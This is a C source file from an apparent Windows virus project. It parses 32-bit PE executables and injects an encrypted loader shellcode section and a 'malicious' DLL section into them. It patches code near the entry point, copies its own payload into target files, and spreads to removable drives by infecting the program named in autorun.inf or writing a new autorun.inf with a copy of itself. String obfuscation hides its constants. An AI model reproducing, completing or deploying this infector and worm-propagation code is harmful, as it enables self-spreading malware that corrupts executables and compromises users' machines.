/*
 * Module:  pe_infect.c
 * Author:  Toni <matzeton@googlemail.com>
 * Purpose: Parses/Modifies a windows portable executable.
 *          Add sections, do image rebasing.
 *          Inject data into sections.
 */

#include "compat.h"
#include "utils.h"
#include "log.h"
#include "pe_infect.h"
#include "mem.h"
#include "file.h"
#include "aes.h"
#include "crypt.h"
#include "patch.h"
#include "crypt_strings.h"
#include "xor_strings_gen.h"
#include "aes_strings_gen.h"
#include "loader_x86_crypt.h"


static DWORD sectionAdr = 0x0;
static const struct loader_x86_data* orig_ldr = NULL;

/* default dll image base */
#ifndef _MILLER_IMAGEBASE
#define _MILLER_IMAGEBASE 0x10000000
#endif
static DWORD imageBase = _MILLER_IMAGEBASE;
static DWORD imageSize = 0x0;

/* AES encrypted byte buffer */
#if defined(_PRE_RELEASE) || defined(_RUN_TESTS)
_AESDATA_(ldrdata, LOADER_SHELLCODE_DEBUG);
static SIZE_T real_ldrsiz = LOADER_SHELLCODE_DEBUG_SIZE;
#else
_AESDATA_(ldrdata, LOADER_SHELLCODE);
static SIZE_T real_ldrsiz = LOADER_SHELLCODE_SIZE;
#endif
_AESSIZE_(ldrsiz, ldrdata);


inline void setOrigLoader(const struct loader_x86_data* ldr) {
    orig_ldr = ldr;
}

inline const struct loader_x86_data* getOrigLoader(void) {
    return orig_ldr;
}

inline void setImageBase(DWORD newBase) {
    imageBase = newBase;
}

inline DWORD getImageBase(void) {
    return imageBase;
}

inline void setImageSize(DWORD newSize) {
    imageSize = newSize;
}

inline DWORD getImageSize(void) {
    return imageSize;
}

inline void setSectionAdr(DWORD newAdr) {
    sectionAdr = newAdr;
}

inline DWORD getSectionAdr(void) {
    return sectionAdr;
}

BYTE* getLoader(SIZE_T* pSiz)
{
    aes_ctx_t* ctx = aes_alloc_ctx((unsigned char*)LDR_KEY, LDR_KEYSIZ);
    BYTE* ldr = (BYTE*)aes_crypt_s(ctx, (char*)ldrdata, (size_t)ldrsiz, (size_t*)pSiz, FALSE);
    aes_free_ctx(ctx);
    return ldr;
}

SIZE_T getRealLoaderSize(void)
{
    return real_ldrsiz;
}

inline BYTE* PtrFromOffset(BYTE* base, DWORD offset) {
    return ((BYTE*)base) + offset;
}

DWORD RvaToOffset(const struct ParsedPE* ppPtr, DWORD dwRva)
{
    PIMAGE_SECTION_HEADER sections = ppPtr->hdrSection;
    DWORD nSections = ppPtr->hdrFile->NumberOfSections;
    DWORD dwPos = 0;

    for (SIZE_T i = 0; i < nSections; ++i) {
        if (dwRva >= sections[i].VirtualAddress) {
           dwPos  = sections[i].VirtualAddress;
           dwPos += sections[i].SizeOfRawData;
        }
        if (dwRva < dwPos) {
          dwRva = dwRva - sections[i].VirtualAddress;
          return dwRva + sections[i].PointerToRawData;
        }
    }
    return -1;
}

inline BYTE* RvaToPtr(const struct ParsedPE* ppPtr, DWORD dwRva)
{
    return PtrFromOffset(ppPtr->ptrToBuf, RvaToOffset(ppPtr, dwRva));
}

DWORD OffsetToRva(const struct ParsedPE* ppPtr, DWORD offset)
{
    if (ppPtr->hdrFile->NumberOfSections <= 0 || ppPtr->hdrOptional->SizeOfHeaders > offset)
        return -1;
    PIMAGE_SECTION_HEADER sections = ppPtr->hdrSection;
    DWORD nSections = ppPtr->hdrFile->NumberOfSections;
    DWORD dwPos = sections[0].VirtualAddress + (offset - sections[0].PointerToRawData);

    for (SIZE_T i = 0; i < nSections; ++i) {
        if (offset < sections[i].PointerToRawData) {
            break;
        }
        dwPos = sections[i].VirtualAddress + (offset - sections[i].PointerToRawData);
    }
    return dwPos + ppPtr->hdrOptional->ImageBase;
}

inline DWORD PtrToOffset(const struct ParsedPE* ppPtr, const BYTE* ptr)
{
    DWORD dwRva = (DWORD)ptr - (DWORD)ppPtr->ptrToBuf;
    return dwRva;
}

DWORD PtrToRva(const struct ParsedPE* ppPtr, const BYTE* ptr)
{
    return OffsetToRva(ppPtr, PtrToOffset(ppPtr, ptr));
}

BOOL bParsePE(BYTE* buf, const DWORD szBuf, struct ParsedPE* ppPtr, BOOL earlyStage)
{
    ppPtr->valid = FALSE;
    /* check minimum size */
    if (szBuf > 0 && szBuf < sizeof(IMAGE_DOS_HEADER)+sizeof(IMAGE_FILE_HEADER)+sizeof(IMAGE_OPTIONAL_HEADER)+sizeof(IMAGE_SECTION_HEADER))
        return FALSE;
    ppPtr->ptrToBuf = buf;
    ppPtr->bufSiz = szBuf;
    ppPtr->hdrDos       = (PIMAGE_DOS_HEADER)buf;
    if (ppPtr->hdrDos->e_magic != IMAGE_DOS_SIGNATURE) /* MZ */
        return FALSE;
    /* validate e_lfanew (0xFF >= x >= 0x40) */
    if ( (szBuf > 0 && szBuf <= (DWORD)ppPtr->hdrDos->e_lfanew) || ppPtr->hdrDos->e_lfanew > 0xFF || ppPtr->hdrDos->e_lfanew < 0x40 )
        return FALSE;
    ppPtr->hdrFile      = (PIMAGE_FILE_HEADER)(buf + ppPtr->hdrDos->e_lfanew + sizeof(DWORD));
    ppPtr->hdrOptional  = (PIMAGE_OPTIONAL_HEADER)(buf + ppPtr->hdrDos->e_lfanew + sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER));
    if (ppPtr->hdrOptional->Magic != 0x010b) /* PE32 */
        return FALSE;
    if (ppPtr->hdrFile->Machine != 0x014C) /* i386 */
        return FALSE;
    ppPtr->hdrSection   = (PIMAGE_SECTION_HEADER)(buf + ppPtr->hdrDos->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    ppPtr->dataDir = (PIMAGE_DATA_DIRECTORY)ppPtr->hdrOptional->DataDirectory;
    ppPtr->valid = TRUE;

    /* during initial image rebasing, dont execute stuff which needs a rebased image */
    if (!earlyStage) {
        ppPtr->hasDLL = FALSE;
        ppPtr->hasLdr = FALSE;
        /* pointer to dll section */
        DBUF(DLLSECTION_ENUM, dllsection);
        if ( (ppPtr->ptrToDLL = pGetSegmentAdr((char*)dllsection, TRUE, ppPtr, &(ppPtr->sizOfDLL))) != NULL && ppPtr->sizOfDLL > 0)
            ppPtr->hasDLL = TRUE;

        /* pointer to loader section */
        DBUF(LDRSECTION_ENUM, ldrsection);
        if ( (ppPtr->ptrToLdr = pGetSegmentAdr((char*)ldrsection, TRUE, ppPtr, &(ppPtr->sizOfLdr))) != NULL && ppPtr->sizOfLdr > 0) {
            ppPtr->loader86 = (loader_x86_data*)(ppPtr->ptrToLdr + getRealLoaderSize() - sizeof(struct loader_x86_data));
            ppPtr->hasLdr = bCheckEndMarker(ppPtr);
            if (!ppPtr->hasLdr) {
                LOG_MARKER;
            }
        }
    }
    return TRUE;
}

BOOL bCheckEndMarker(const struct ParsedPE *ppPtr)
{
    unsigned char orig_loader_endmarker[] = { _LOADER_ENDMARKER };
    unsigned char* loader_endmarker = (unsigned char*)&(ppPtr->loader86->endMarker);
    BOOL ret = TRUE;
    for (size_t i = 0; i < sizeof(orig_loader_endmarker); ++i) {
        if (loader_endmarker[i] != orig_loader_endmarker[i]) {
            ret = FALSE;
            break;
        }
    }
    return ret;
}

BOOL bAddSection(const char *sName, const BYTE *sectionContentBuf, SIZE_T szSection, BOOL executable, struct ParsedPE *ppPtr)
{
    /* Peering Inside the PE: https://msdn.microsoft.com/en-us/library/ms809762.aspx */

    /* enough header space avail? */
    if (ppPtr->hdrOptional->SizeOfHeaders < (ppPtr->hdrDos->e_lfanew + sizeof(DWORD) +
            sizeof(IMAGE_FILE_HEADER) + ppPtr->hdrFile->SizeOfOptionalHeader +
            (ppPtr->hdrFile->NumberOfSections*sizeof(IMAGE_SECTION_HEADER))+sizeof(IMAGE_SECTION_HEADER)))
    {
        return FALSE;
    }

    /* Read the original fields of headers */
    DWORD originalNumberOfSections = ppPtr->hdrFile->NumberOfSections;
    /* Create the new section */
    DWORD pointerToLastSection = 0;
    DWORD sizeOfLastSection = 0;
    DWORD virtualAddressOfLastSection = 0;
    DWORD virtualSizeOfLastSection = 0;

    for(SIZE_T i = 0; i != originalNumberOfSections; ++i)
    {
        if (pointerToLastSection < ppPtr->hdrSection[i].PointerToRawData)
        {
            /* section alrdy exists? */
            if ( strncmp((const char*)ppPtr->hdrSection[i].Name, sName, IMAGE_SIZEOF_SHORT_NAME) == 0)
                return FALSE;
            pointerToLastSection        = ppPtr->hdrSection[i].PointerToRawData;
            sizeOfLastSection           = ppPtr->hdrSection[i].SizeOfRawData;
            virtualAddressOfLastSection = ppPtr->hdrSection[i].VirtualAddress;
            virtualSizeOfLastSection    = ppPtr->hdrSection[i].Misc.VirtualSize;
        }
    }
    /* if a symbol table (debug info) is present, pointerToLastSection might be wrong */
    /* symbol table is usually stored _after_ the last section and retrieved via IMAGE_FILE_HEADER.PointerToSymbolTable */
    if (ppPtr->bufSiz > pointerToLastSection + sizeOfLastSection)
    {
        pointerToLastSection = ppPtr->bufSiz;
        sizeOfLastSection = 0;
    }

    /* set new section header data */
    IMAGE_SECTION_HEADER newImageSectionHeader;
    memset(&newImageSectionHeader, '\0', sizeof(IMAGE_SECTION_HEADER));
    newImageSectionHeader.Misc.VirtualSize     = szSection;
    memcpy(&newImageSectionHeader.Name, sName, strnlen(sName, sizeof(newImageSectionHeader.Name)));
    newImageSectionHeader.PointerToRawData     = XMemAlign(pointerToLastSection + sizeOfLastSection, ppPtr->hdrOptional->FileAlignment, 0);
    newImageSectionHeader.PointerToRelocations = 0;
    newImageSectionHeader.SizeOfRawData        = XMemAlign(szSection, ppPtr->hdrOptional->FileAlignment, 0); /* aligned to FileAlignment */
    newImageSectionHeader.VirtualAddress       = XMemAlign(virtualSizeOfLastSection, ppPtr->hdrOptional->SectionAlignment, virtualAddressOfLastSection); /* aligned to Section Alignment */
    /* Loader is usually stored in an executable section, DLL in a readonly section.
     * The Loader does not execute code directly from section.
     * (see loader source for detailed info)
     */
    newImageSectionHeader.Characteristics      = (executable == TRUE ? IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE : IMAGE_SCN_MEM_READ);

    /* update FILE && OPTIONAL header */
    ++ppPtr->hdrFile->NumberOfSections;
    ppPtr->hdrOptional->SizeOfImage = XMemAlign(newImageSectionHeader.VirtualAddress + newImageSectionHeader.Misc.VirtualSize, ppPtr->hdrOptional->SectionAlignment, 0);
    /* save SizeOfImage, because ppPtr->hdrOptional->SizeOfImage might be invalid (re-allocation!) */
    SIZE_T szNewSizOfImage = ppPtr->hdrOptional->SizeOfImage;
    /* (re)allocate memory for _full_ pe image (including all headers, new section and section data) */
    if (!(ppPtr->ptrToBuf = realloc(ppPtr->ptrToBuf, szNewSizOfImage)))
        return FALSE;

    /* if everything is gone right, parsing should succeed */
    if (!bParsePE(ppPtr->ptrToBuf, szNewSizOfImage, ppPtr, FALSE))
    {
        return FALSE;
    }

    /* copy new section header */
    memcpy(&ppPtr->hdrSection[ppPtr->hdrFile->NumberOfSections-1], &newImageSectionHeader, sizeof(IMAGE_SECTION_HEADER));
    /* copy new section data */
    memcpy(ppPtr->ptrToBuf+newImageSectionHeader.PointerToRawData, sectionContentBuf, szSection);

    return TRUE;
}

static BOOL bFindMyself(struct ParsedPE* ppe, DWORD* pDwBase, DWORD* pDwSize)
{
    SIZE_T siz = 0x0;
    DWORD startAdr = 0x0;

    /* Am I already in an infected binary? */
    if (ppe->hasDLL) {
        startAdr = (DWORD)ppe->ptrToDLL;
        siz = ppe->sizOfDLL;
    }
    /* dirty workaround e.g. when started from runbin.exe */
    if (!startAdr) {
        startAdr = getSectionAdr();
    }
    if (!siz) {
        siz = getImageSize();
    }
    /* check dwBase for valid memory region */
    if (startAdr)
    {
        *pDwBase = startAdr;
        *pDwSize = siz;
        if (_IsBadReadPtr((void*)startAdr, siz) == TRUE)
        {
            *pDwBase = 0x0;
            *pDwSize = 0x0;
            LOG_MARKER
        } else return TRUE;
    } else LOG_MARKER
    return FALSE;
}

static struct ParsedPE*
pParsePE(BYTE* buf, SIZE_T szBuf)
{
    struct ParsedPE* ppe = calloc(1, sizeof(struct ParsedPE));

    if (!ppe)
    {
        return NULL;
    }
    if (bParsePE(buf, szBuf, ppe, FALSE))
    {
        return ppe;
    }
    free(ppe);
    return NULL;
}

static BOOL bInfectMemWith(const BYTE* maliciousBuf, SIZE_T maliciousSiz, struct ParsedPE* ppe)
{
    BOOL ret = FALSE;

    if (ppe)
    {
        if (bIsInfected(ppe)) {
            LOG_MARKER
        } else {
            DBUF(DLLSECTION_ENUM, dllsection);
            if (bAddSection((char*)dllsection, maliciousBuf, maliciousSiz, FALSE, ppe))
            {
                ret = TRUE;
            } else LOG_MARKER

            DBUF(LDRSECTION_ENUM, ldrsection);
            SIZE_T lsiz = 0;
            BYTE* l     = getLoader(&lsiz);
            if (l && bAddSection((char*)ldrsection, l, lsiz, TRUE, ppe))
            {
                ret = TRUE;
            } else LOG_MARKER;
            if (l) free(l);

            if (ret) {
                ret = bParsePE(ppe->ptrToBuf, ppe->bufSiz, ppe, FALSE);
            }
        }
    }
    else
    {
        LOG_MARKER
    }
    return ret;
}

BOOL bInfectFileWith(const char* sFile, const BYTE* maliciousBuf, SIZE_T maliciousSiz)
{
    BOOL ret = FALSE;
    BYTE* buf;
    SIZE_T szBuf;
    HANDLE hFile;

    if (!bOpenFile(sFile, OF_WRITEACCESS, &hFile)) {
        LOG_MARKER
        return ret;
    }
    if (!bFileToBuf(hFile, &buf, &szBuf))
    {
        LOG_MARKER
        _CloseHandle(hFile);
        return ret;
    }
    struct ParsedPE* ppe = pParsePE(buf, szBuf);
    if (ppe)
    {
        if (bInfectMemWith(maliciousBuf, maliciousSiz, ppe))
        {
            if (bPatchNearEntry(ppe))
            {
                if (nBufToFile(hFile, ppe->ptrToBuf, ppe->bufSiz) == ppe->bufSiz)
                {
                    if (!bIsInfected(ppe))
                    {
                        LOG_MARKER
                    } else {
                        ret = TRUE;
                    }
                }
            } else {
                LOG_MARKER
            }
        }
        /* buf might not valid anymore (after bInfectMemWith(...) called) */
        buf = ppe->ptrToBuf;
        free(ppe);
    } else LOG_MARKER;
    free(buf);
    _CloseHandle(hFile);
    return ret;
}

BOOL bInfectWithMyself(const char* sFile)
{
    BOOL ret = FALSE;
    BYTE* buf = NULL;
    SIZE_T szBuf;
    LPTSTR sFileMyself = calloc(sizeof(TCHAR), MAX_PATH+1);
    HANDLE hMyself;
    struct ParsedPE* ppe = NULL;

    if (!sFileMyself)
    {
        LOG_MARKER
    } else if (_GetModuleFileName(NULL, sFileMyself, MAX_PATH) == 0)
    {
        LOG_MARKER
    } else if (!bOpenFile(sFileMyself, 0, &hMyself)) {
        LOG_MARKER
    } else if (!bFileToBuf(hMyself, &buf, &szBuf))
    {
        LOG_MARKER
    } else {
        ppe = pParsePE(buf, szBuf);
    }
    if (ppe)
    {
        /* find DLL (segment-)address and (segment-)size in current executable */
        DWORD dwBase = 0x0;
        DWORD dwSize = 0x0;
        if (!bFindMyself(ppe, &dwBase, &dwSize))
        {
            LOG_MARKER
        } else {
            /* infect target executable (DLL and LOADER)
             * Remember: The Loader is always accessible by our DLL (AES encrypted).
             */
            if (bInfectFileWith(sFile, (BYTE*)dwBase, dwSize)) {
                ret = TRUE;
            } else { LOG_MARKER }
        }
        free(ppe);
    } else LOG_MARKER;
    if (buf)
        free(buf);
    _CloseHandle(hMyself);
    free(sFileMyself);
    return ret;
}

BOOL bIsInfected(const struct ParsedPE* ppPtr)
{
    return (ppPtr->hasDLL && ppPtr->hasLdr);
}

void* pGetSegmentAdr(const char* sName, BOOL caseSensitive, const struct ParsedPE* ppPtr, SIZE_T* pSegSiz)
{
    DWORD result = 0;
    DWORD sSize  = 0;

    if (!ppPtr->valid) return NULL;
    /* walk through sections and compare every name with sName */
    for (DWORD idx = 0; idx < ppPtr->hdrFile->NumberOfSections; ++idx)
    {
        PIMAGE_SECTION_HEADER sec = &ppPtr->hdrSection[idx];
        if ( (caseSensitive && strncmp(sName, (const char *)sec->Name, IMAGE_SIZEOF_SHORT_NAME) == 0)
                || strnicmp(sName, (const char *)sec->Name, IMAGE_SIZEOF_SHORT_NAME) == 0)
        {
            result = RvaToOffset(ppPtr, sec->VirtualAddress);
            sSize = sec->Misc.VirtualSize;
            break;
        }
    }

    if (result != 0)
    {
        /* check for valid RVA */
        result += (DWORD)ppPtr->ptrToBuf;
        if (_IsBadReadPtr((void*)result, sSize))
        {
            result = 0;
        }
    }

    if (pSegSiz)
        *pSegSiz = sSize;
    return (void*)result;
}

DWORD dwDoRebase(void* dllSectionAdr, SIZE_T dllSectionSiz, const void* dllBaseAdr)
{
    struct ParsedPE ppe;

    if (!bParsePE(dllSectionAdr, dllSectionSiz, &ppe, TRUE))
        return 0;

    /* find symbol relocations (.reloc section) */
    DWORD dwBaseReloc = ppe.dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)RvaToPtr(&ppe, dwBaseReloc);
    PIMAGE_BASE_RELOCATION pRelocEnd = (PIMAGE_BASE_RELOCATION)((PBYTE)pBaseReloc + ppe.dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);

    /* We cant rely on getImageBase(), because variable imageBase might point to a faulty memory location. *
     * Rebasing is one of the first things to do!
     */
    DWORD dllImageBase = _MILLER_IMAGEBASE;
    DWORD dwDelta = (DWORD)dllBaseAdr - dllImageBase;

    /* walk through all relocation entries and add delta to every entry */
    while (pBaseReloc < pRelocEnd && pBaseReloc->VirtualAddress)
    {
        int count       = (pBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* wCurEntry = (WORD*)(pBaseReloc + 1);
        void *pPageVa   = (void *)((PBYTE)dllBaseAdr + pBaseReloc->VirtualAddress);

        for (int i = 0; i < count; i++)
        {
            if (wCurEntry[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                *(DWORD *)((PBYTE)pPageVa + (wCurEntry[i] & 0x0fff)) += dwDelta;
            }
        }
        pBaseReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pBaseReloc + pBaseReloc->SizeOfBlock);
    }
    return dwDelta;
}

static int szReadAutorunInf(LPCSTR szPath, LPSTR pTarget, SIZE_T szTarget)
{
    int retval   = -1;
    BYTE* buf    = NULL;
    SIZE_T szBuf = 0;

    (void) szTarget;
    if (bFileNameToBuf(szPath, &buf, &szBuf) == TRUE) {
        DBUF(AUTORUN_OPEN_ENUM, __autoOpen);
        /* parse `open=` substring */
        const char* dbuf = COMPAT(strnistr)((const char*)buf, __autoOpen, szBuf);
        int szOpen = 0;

        if (!dbuf)
            goto end;
        dbuf += strnlen(__autoOpen, CLEN(AUTORUN_OPEN_ENUM));

        /* read line until NEWLINE or NUL */
        char* szEnd = strchr(dbuf, '\n');
        if (szEnd) {
            szOpen = (DWORD)szEnd - (DWORD)(dbuf);
            /* windoze uses carriage returns */
            if (szOpen > 1 && dbuf[szOpen-2] == '\r')
                szEnd--;
        } else {
            /* no newline found, so use whole buffer */
            szOpen = strnlen(dbuf, szBuf);
        }

        if (szOpen > 0) {
            const char* prog = dbuf;
            if (qtok((char*)dbuf, (char**)&dbuf) && *dbuf) {
                szOpen = dbuf - prog - 1;
                memmove(pTarget, prog, szOpen);
                pTarget[szOpen] = 0;
            }
        }

        retval = szOpen;
    }

end:
    free(buf);
    return retval;
}

DWORD dwInfectRemovables(void)
{
    DWORD retval = 0;
    struct LogicalDrives* devs = calloc(DEFAULT_DEVS, sizeof(struct LogicalDrives));

    if (devs) {
        DWORD count = dwEnumDrives(devs, DEFAULT_DEVS);
        if (count > 0) {
            LPTSTR cmd  = _GetCommandLine();
            LPTSTR next = NULL;
            LPTSTR arg0 = NULL;
            DBUF(FILE_AUTORUN_INF_ENUM, __autorun);

            if (!cmd)
                goto end;
            if (qtok(cmd, &next) && *next) {
                arg0 = cmd;
            } 

            BOOL useCurrentBinary = FALSE;
            BYTE* buf    = NULL;
            SIZE_T szBuf = 0;
            struct ParsedPE* ppe = NULL;
            if (bFileNameToBuf(arg0, &buf, &szBuf) == TRUE) {
                ppe = pParsePE(buf, szBuf);
                if (ppe && dwCountNonSystemImportLibs(ppe) == 0) {
                    useCurrentBinary = TRUE;
                }
            }

            for (DWORD i = 0; i < count; ++i) {
                if (devs[i].devType == DRIVE_REMOVABLE) {
#ifdef _PRE_RELEASE
                    COMPAT(printf)("Infecting Drive: %s\n", devs[i].name);
#endif
                    /* if autorun program exists, try to infect the executable it points */
                    char* fullPath = calloc(MAX_PATH+1,  sizeof(char));
                    if (isFileInDir(devs[i].name, __autorun) == TRUE) {
                        DBUF(DIRFILE_FMT_ENUM, __fmt);
                        if (COMPAT(snprintf)(fullPath, MAX_PATH+1, __fmt, devs[i].name, __autorun) > 0) {
                            if (szReadAutorunInf(fullPath, fullPath, MAX_PATH) >= 0) {
#if defined(_PRE_RELEASE) && defined(_EXTRA_VERBOSE)
                                COMPAT(printf)("Infecting: %s\n", fullPath);
#endif
                                if (!bInfectWithMyself(fullPath))
                                    LOG_MARKER;
                            } else LOG_MARKER;
                        } else LOG_MARKER;
                    } else if (useCurrentBinary == TRUE) {
                        /* if no autorun executable detected, just copy ourself to it (if possible) */
                        DBUF(FILE_AUTORUN_INF_ENUM, __autorunInf);
                        DBUF(AUTORUN_FMT_ENUM, __autorunInfFmt);
                        DBUF(FILE_AUTORUN_EXE_ENUM, __autorunExe);
                        DBUF(DIRFILE_FMT_ENUM, __dirfile);

                        char* autorunInf = calloc(MAX_PATH+1, sizeof(char));
                        int len = COMPAT(snprintf)(autorunInf, MAX_PATH+1, __autorunInfFmt, devs[i].name, __autorunExe);
                        COMPAT(snprintf)(fullPath, MAX_PATH+1, __dirfile, devs[i].name, __autorunInf);
                        if (bBufToFileName(fullPath, OF_WRITEACCESS | OF_CREATENEW, (BYTE*)autorunInf, len) != TRUE)
                            LOG_MARKER;

                        TGL_FLAG(ppe->loader86, FLAG_SHELLEXEC_ONLY);
                        COMPAT(snprintf)(fullPath, MAX_PATH+1, __dirfile, devs[i].name, __autorunExe);
                        if (bBufToFileName(fullPath, OF_WRITEACCESS | OF_CREATENEW, buf, szBuf) != TRUE)
                            LOG_MARKER;
                        free(autorunInf);
                    } else LOG_MARKER;
                    free(fullPath);
                }
            }

            free(ppe);
            free(buf);
        }
    }
end:
    free(devs);
    return retval;
}

DWORD dwCountNonSystemImportLibs(const struct ParsedPE* ppPtr)
{
    DWORD retval = -1;
    char* sysDir = calloc(MAX_PATH+1, sizeof(char));

    if (ppPtr->valid == TRUE) {
        DWORD adr = ppPtr->dataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        PIMAGE_IMPORT_DESCRIPTOR idt = (PIMAGE_IMPORT_DESCRIPTOR)RvaToPtr(ppPtr, adr);

        if (_GetSystemDirectory(sysDir, MAX_PATH) == 0)
            goto end;

        retval = 0;
        while (idt->Name) {
            if (isFileInDir(sysDir, (LPSTR)RvaToPtr(ppPtr, idt->Name)) == TRUE) {
#if defined(_PRE_RELEASE) && defined(_EXTRA_VERBOSE)
                COMPAT(printf)("SYS-DLL found: %s\\%s !!\n", sysDir, (LPSTR)RvaToPtr(ppPtr, idt->Name));
#endif
            } else retval++;
            idt++;
        }
    }

end:
    free(sysDir);
    return retval;
}

FARPROC WINAPI fnMyGetProcAddress(HMODULE hModule, LPCSTR szProcName)
{
    if (! hModule || ! szProcName)
        return NULL;

    BYTE* modb = (BYTE*)hModule;
    struct ParsedPE ppe = {0};
    if (! bParsePE(modb, 0, &ppe, TRUE) || ! ppe.valid)
        return NULL;

    PIMAGE_DATA_DIRECTORY eDataDir = (PIMAGE_DATA_DIRECTORY)(&ppe.dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    PIMAGE_EXPORT_DIRECTORY eDir   = (PIMAGE_EXPORT_DIRECTORY)(modb + eDataDir->VirtualAddress);

    void** funcTable = (void**)(modb + eDir->AddressOfFunctions);
    WORD*  ordTable  = (WORD*) (modb + eDir->AddressOfNameOrdinals);
    char** nameTable = (char**)(modb + eDir->AddressOfNames);
    void*  address   = NULL;
    size_t nProcName = COMPAT(strlen)(szProcName);

    if ( ((DWORD)(szProcName) >> 16) == 0 ) {
        /* import by ordinal */
        WORD ordinal  = LOWORD(szProcName);
        DWORD ordBase =  eDir->Base;
        /* valid orinal? */
        if (ordinal < ordBase || ordinal > ordBase + eDir->NumberOfFunctions)
            return NULL;
        address = (void*)(modb + (DWORD)funcTable[ordinal - ordBase]);
    } else {
        /* import by name */
        for (DWORD i = 0; i < eDir->NumberOfNames; ++i) {
            /* calculate name tables pointer from RVA */
            if (COMPAT(strncmp)(szProcName, (const char*)(modb + (DWORD)nameTable[i]), nProcName) == 0) {
                address = (void*)(modb + (DWORD)funcTable[ordTable[i]]);
            }
        }
    }

    return address;
}
